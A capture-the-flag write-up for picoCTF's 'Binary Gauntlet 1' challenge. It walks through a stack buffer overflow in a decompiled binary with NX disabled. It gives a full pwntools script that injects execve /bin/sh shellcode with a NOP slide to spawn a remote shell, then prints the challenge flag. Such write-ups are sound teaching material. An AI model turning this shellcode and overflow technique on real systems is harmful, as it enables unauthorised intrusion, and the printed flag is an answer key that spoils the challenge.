# picoCTF Binary Gauntlet 1 Write Up

## Details:
Points: 30

Jeopardy style CTF

Category: Binary Exploitation

Comments: Okay, time for a challenge. gauntlet nc mercury.picoctf.net 19968

## Write up:

Opening up the file in a decompiler we see the main function:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[104]; 
  char *s;

  s = (char *)malloc(1000uLL);
  printf("%p\n", dest);
  fflush(_bss_start);
  fgets(s, 1000, stdin);
  s[999] = 0;
  printf(s);
  fflush(_bss_start);
  fgets(s, 1000, stdin);
  s[999] = 0;
  strcpy(dest, s);
  return 0;
}
```

I noticed almost immediately that the vulnerability was a buffer overflow since we were copying a 999 character string to a 103 character string.

There were no references of the flag in the program so I knew that I would need to get shell access to the machine the program was running on. 

First I checked the security on the binary:

```
checksec --file=gauntlet                             

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               3gauntlet
```

I saw that NX was disabled which meant that the stack was executable. They gave us the address of dest which was a fairly big hint. 

At this point my plan of attack was to write the shellcode to dest and then do a buffer overflow so that I could overwrite where the return goes to.

I used cyclic from pwntools to generate a pattern and saw that after 120 characters we would need to write the address we wanted to go to. I then created the following python script:

```python
# import pwn tools
from pwn import *

# open remote process
r = remote('mercury.picoctf.net', 19968)

# get the line with the address
address = r.recvline() 

# turn address into an int so we can add later on
address = int(address[:-1], 16)

# send arbitrary text
r.send('boo\n')

# get the next line
r.recvline()

# 64 bit shellcode
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# 96 nops for the nop slide
NOPS = b'\x90'*96

# craft payload
payload = shellcode + NOPS + p64(address)

# send payload
r.send(payload + b'\n')

# get interactive mode
r.interactive()
```

Running the script I got:

```
[+] Opening connection to mercury.picoctf.net on port 19968: Done
[*] Switching to interactive mode

$ ls
flag.txt
gauntlet
gauntlet_no_aslr
xinet_startup.sh

$ cat flag.txt
7504344981b9288c5669150ada84894e
```

The flag was:

```
7504344981b9288c5669150ada84894e
```